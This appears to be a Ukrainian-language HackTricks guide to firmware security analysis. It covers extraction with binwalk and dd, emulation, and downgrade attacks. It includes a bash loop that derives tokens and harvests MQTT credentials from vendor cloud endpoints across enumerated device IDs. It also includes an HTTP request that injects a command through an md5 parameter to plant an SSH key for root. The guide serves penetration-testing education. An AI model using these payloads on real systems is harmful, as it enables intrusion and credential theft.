# Аналіз прошивки

{{#include ../../banners/hacktricks-training.md}}

## **Вступ**

### Пов'язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}


Прошивка — це критично важливе програмне забезпечення, яке забезпечує коректну роботу пристроїв, керуючи та полегшуючи взаємодію між апаратними компонентами та програмним забезпеченням, з яким взаємодіють користувачі. Вона зберігається в постійній пам'яті, що гарантує доступ пристрою до необхідних інструкцій з моменту увімкнення й веде до запуску операційної системи. Дослідження та, можливо, модифікація прошивки є важливим етапом у виявленні вразливостей безпеки.

## **Збір інформації**

**Збір інформації** — критичний початковий крок для розуміння складу пристрою та технологій, які він використовує. Цей процес включає збирання даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості bootloader
- Апаратну схему та datasheets
- Метрики кодової бази та місця розташування її джерел
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень та регуляторні сертифікації
- Архітектурні діаграми та діаграми потоків
- Оцінки безпеки та виявлені вразливості

Для цього незамінні інструменти **open-source intelligence (OSINT)**, а також аналіз будь-яких доступних компонентів open-source програмного забезпечення шляхом ручного та автоматизованого перегляду. Інструменти, як-от [Coverity Scan](https://scan.coverity.com) та [Semmle’s LGTM](https://lgtm.com/#explore), пропонують безкоштовний статичний аналіз, який можна використати для виявлення потенційних проблем.

## **Отримання прошивки**

Отримання прошивки можна здійснювати різними способами, кожен з яких має свій рівень складності:

- **Безпосередньо** від джерела (розробники, виробники)
- **Зібрати** її за наданими інструкціями
- **Завантажити** з офіційних сайтів підтримки
- Використовуючи **Google dork**-запити для знаходження розміщених файлів прошивки
- Доступ до **хмарного сховища** безпосередньо, за допомогою інструментів, таких як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплення **оновлень** через man-in-the-middle техніки
- **Екстракція** з пристрою через з'єднання, такі як **UART**, **JTAG** або **PICit**
- Sniffing трафіку на наявність запитів на оновлення в комунікаціях пристрою
- Виявлення та використання **hardcoded update endpoints**
- Dumping з bootloader або мережі
- **Видалення та читання** чіпа пам'яті, коли інші методи не спрацювали, із застосуванням відповідних апаратних інструментів

## Аналіз прошивки

Тепер, коли ви **маєте прошивку**, потрібно витягти з неї інформацію, щоб зрозуміти, як її опрацьовувати. Різні інструменти, які ви можете використати для цього:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
If you don't find much with those tools check the **ентропію** образу with `binwalk -E <bin>`, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed in some way).

Moreover, you can use these tools to extract **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) to inspect the file.

### Отримання файлової системи

With the previous commented tools like `binwalk -ev <bin>` you should have been able to **extract the filesystem**.\
Binwalk usually extracts it inside a **folder named as the filesystem type**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне витягнення файлової системи

Sometimes, binwalk will **not have the magic byte of the filesystem in its signatures**. In these cases, use binwalk to **find the offset of the filesystem and carve the compressed filesystem** from the binary and **manually extract** the filesystem according to its type using the steps below.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Запустіть наступну **dd command** для carving файлової системи Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Альтернативно, також можна виконати наступну команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використано в наведеному вище прикладі)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у директорії "`squashfs-root`".

- Архівні файли CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs з NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз прошивки

Після отримання прошивки важливо розібрати її, щоб зрозуміти структуру та можливі вразливості. Цей процес передбачає використання різних інструментів для аналізу та вилучення цінних даних з образу прошивки.

### Інструменти початкового аналізу

Наведено набір команд для початкового огляду бінарного файлу (названого `<bin>`). Ці команди допомагають ідентифікувати типи файлів, витягувати рядки, аналізувати бінарні дані та з'ясовувати відомості про розділи та файлові системи:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Щоб оцінити статус encryption образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія вказує на відсутність encryption, тоді як висока — на можливе encryption або стиснення.

Для витягування **вбудованих файлів**, рекомендовано використовувати інструменти та ресурси, такі як документація **file-data-carving-recovery-tools** та **binvis.io** для інспекції файлів.

### Витяг файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна витягти файлову систему, часто в директорію, названу за типом файлової системи (наприклад, squashfs, ubifs). Однак коли **binwalk** не може розпізнати тип файлової системи через відсутність магічних байтів, необхідне ручне витягнення. Це включає використання `binwalk` для визначення зсуву (offset) файлової системи, після чого командою `dd` вирізають файлову систему:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Після цього, залежно від типу файлової системи (e.g., squashfs, cpio, jffs2, ubifs), для ручного витягання вмісту використовуються різні команди.

### Аналіз файлової системи

Після витягнення файлової системи починається пошук вразливостей. Увага приділяється ненадійним мережевим демоням, захардкоженим обліковим даним, API endpoint'ам, функціям серверів оновлення, нескомпільованому коду, стартовим скриптам та скомпільованим бінарним файлам для офлайн-аналізу.

**Ключові місця** та **елементи**, які слід перевірити, включають:

- **etc/shadow** та **etc/passwd** для облікових даних користувачів
- SSL сертифікати та ключі в **etc/ssl**
- Конфігураційні та скриптові файли на предмет потенційних вразливостей
- Вбудовані бінарні файли для подальшого аналізу
- Типові веб-сервери IoT-пристроїв та бінарні файли

Декілька інструментів допомагають виявляти чутливу інформацію та вразливості в межах файлової системи:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) та [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку чутливої інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для комплексного аналізу прошивки
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), та [**EMBA**](https://github.com/e-m-b-a/emba) для статичного та динамічного аналізу

### Перевірки безпеки скомпільованих бінарних файлів

Як вихідний код, так і скомпільовані бінарні файли, знайдені у файловій системі, повинні бути ретельно перевірені на вразливості. Інструменти як **checksec.sh** для Unix-бінарів та **PESecurity** для Windows-бінарів допомагають виявити незахищені бінарні файли, які можуть бути використані.

## Збирання cloud config та MQTT-облікових даних за допомогою похідних URL-токенів

Багато IoT-хабів отримують конфігурацію для кожного пристрою з cloud endpoint, який виглядає приблизно так:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Під час аналізу прошивки можна виявити, що <token> походить локально від device ID з використанням захардкодженого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Такий підхід дозволяє будь-кому, хто дізнається deviceId і STATIC_KEY, реконструювати URL та витягнути cloud config, що часто розкриває MQTT-облікові дані у відкритому тексті та префікси тем.

Практичний робочий процес:

1) Extract deviceId from UART boot logs

- Підключіть UART-адаптер 3.3V (TX/RX/GND) і захопіть логи:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, що виводять cloud config URL pattern і broker address, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновити STATIC_KEY та алгоритм токена з firmware

- Завантажте бінарні файли в Ghidra/radare2 та шукайте шлях конфігурації ("/pf/") або використання MD5.
- Підтвердіть алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Отримайте токен у Bash та переведіть дайджест у верхній регістр:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Отримайте cloud config та MQTT credentials

- Складіть URL та витягніть JSON за допомогою curl; розпарсіть за допомогою jq, щоб витягти secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживання plaintext MQTT та слабкими topic ACLs (якщо присутні)

- Використовуйте відновлені облікові дані, щоб підписатися на maintenance topics і шукати чутливі події:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перебір передбачуваних device IDs (масштабно, з авторизацією)

- Багато екосистем вбудовують vendor OUI/product/type bytes, за якими слідує послідовний суфікс.
- Ви можете ітеративно перебирати candidate IDs, генерувати tokens та програмно отримувати configs:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Примітки
- Завжди отримуйте явну авторизацію перед спробою mass enumeration.
- Віддавайте перевагу emulation або static analysis для відновлення secrets без модифікації цільового hardware коли це можливо.


Процес emulating firmware дозволяє виконувати **dynamic analysis** як роботи пристрою, так і окремої програми. Такий підхід може стикатися з проблемами, пов'язаними з hardware або architecture dependencies, але передача root filesystem або конкретних binaries на пристрій з відповідною architecture та endianness, наприклад Raspberry Pi, або на готову virtual machine, може полегшити подальше тестування.

### Емуляція окремих binaries

Для дослідження окремих програм важливо визначити endianness програми та CPU architecture.

#### Приклад з MIPS Architecture

Щоб емулювати MIPS architecture binary, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А щоб встановити необхідні інструменти емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Для MIPS (big-endian) використовується `qemu-mips`, а для little-endian бінарників — `qemu-mipsel`.

#### Емуляція архітектури ARM

Для ARM-бінарників процес подібний — для емуляції використовується `qemu-arm`.

### Повна емуляція системи

Інструменти на кшталт [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші полегшують повну емуляцію прошивки, автоматизують процес і сприяють динамічному аналізу.

## Динамічний аналіз на практиці

На цьому етапі для аналізу використовується реальне або емуляційне середовище пристрою. Важливо зберігати доступ до shell, ОС і файлової системи. Емуляція може не імітувати апаратні взаємодії ідеально, тому іноді доводиться перезапускати емуляцію. Аналіз має повторно перевіряти файлову систему, досліджувати доступні веб-сторінки та мережеві сервіси, а також вивчати вразливості bootloader. Тести цілісності прошивки критично важливі для виявлення можливих backdoor-вразливостей.

## Runtime-аналіз

Runtime-аналіз передбачає взаємодію з процесом або бінарним файлом у його робочому середовищі, з використанням інструментів на кшталт gdb-multiarch, Frida і Ghidra для встановлення breakpoints і виявлення вразливостей через fuzzing та інші методи.

## Експлуатація бінарників та Proof-of-Concept

Розробка PoC для виявлених вразливостей вимагає глибокого розуміння цільової архітектури та програмування мовами нижчого рівня. Захисти бінарного виконання в embedded-системах трапляються рідко, але коли є, можуть знадобитися техніки на кшталт Return Oriented Programming (ROP).

## Підготовлені операційні системи для аналізу прошивок

ОС на кшталт [AttifyOS](https://github.com/adi0x90/attifyos) і [EmbedOS](https://github.com/scriptingxss/EmbedOS) надають попередньо налаштовані середовища для тестування безпеки прошивок, оснащені необхідними інструментами.

## Готові ОС для аналізу прошивок

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS — дистрибутив, призначений для допомоги у проведенні security assessment та penetration testing пристроїв Internet of Things (IoT). Він заощаджує багато часу, надаючи попередньо налаштоване середовище з усіма необхідними інструментами.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Операційна система для embedded security testing, базована на Ubuntu 18.04, попередньо укомплектована інструментами для тестування безпеки прошивок.

## Атаки з пониженням версії прошивки (downgrade) та незахищені механізми оновлення

Навіть коли вендор реалізує перевірки криптографічних підписів для образів прошивки, **захист від version rollback (downgrade) часто відсутній**. Якщо boot- або recovery-loader лише перевіряє підпис за допомогою вбудованого public key, але не порівнює *version* (або монотонний лічильник) образу, що прошивається, атакуючий може легітимно встановити **старішу, вразливу прошивку, яка все ще має дійний підпис** і таким чином повторно ввести виправлені вразливості.

Типовий сценарій атаки:

1. **Отримати старіший підписаний образ**
* Забрати його з публічного порталу завантажень вендора, CDN або сторінки підтримки.
* Витягнути його з компаньйонних мобільних/десктопних додатків (наприклад всередині Android APK під `assets/firmware/`).
* Отримати його зі сторонніх репозиторіїв, таких як VirusTotal, інтернет-архіви, форуми тощо.
2. **Завантажити або подати образ на пристрій** через будь-який відкритий канал оновлення:
* Web UI, mobile-app API, USB, TFTP, MQTT тощо.
* Багато споживчих IoT-пристроїв відкривають *unauthenticated* HTTP(S) endpoints, які приймають Base64-encoded firmware blobs, декодують їх на сервері і запускають recovery/upgrade.
3. Після пониження версії експлуатувати вразливість, яка була виправлена в новішому релізі (наприклад фільтр для command-injection, який був доданий пізніше).
4. За потреби прошити назад останній образ або відключити оновлення, щоб уникнути виявлення після отримання постійного доступу.

### Приклад: Command Injection після downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (downgraded) прошивці параметр `md5` безпосередньо підставляється в shell command без санітизації, що дозволяє ін’єкцію довільних команд (тут — enabling SSH key-based root access). У пізніших версіях прошивки введено базовий фільтр символів, але відсутність downgrade protection робить це виправлення марним.

### Витяг прошивки з мобільних додатків

Багато постачальників включають повні образи прошивки в супутні мобільні додатки, щоб додаток міг оновлювати пристрій через Bluetooth/Wi‑Fi. Ці пакети зазвичай зберігаються незашифрованими в APK/APEX за шляхами на кшталт `assets/fw/` або `res/raw/`. Інструменти, такі як `apktool`, `ghidra` або навіть простий `unzip`, дозволяють витягти підписані образи без доступу до фізичного обладнання.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Контрольний список для оцінки логіки оновлення

* Чи належним чином захищено транспорт/автентифікацію *update endpoint* (TLS + authentication)?
* Чи порівнює пристрій **version numbers** або **monotonic anti-rollback counter** перед прошивкою?
* Чи перевіряється образ у межах secure boot chain (наприклад, підписи перевіряються ROM code)?
* Чи виконує userland code додаткові перевірки цілісності/санітарності (наприклад, дозволена карта розділів, номер моделі)?
* Чи повторно використовують *partial* або *backup* потоки оновлення ту саму логіку валідації?

> 💡  Якщо будь-який із наведеного відсутній, платформа, ймовірно, вразлива до rollback attacks.

## Vulnerable firmware to practice

Для практики пошуку вразливостей у firmware використовуйте наступні вразливі firmware-проекти як відправну точку.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Посилання

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Навчання та сертифікація

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
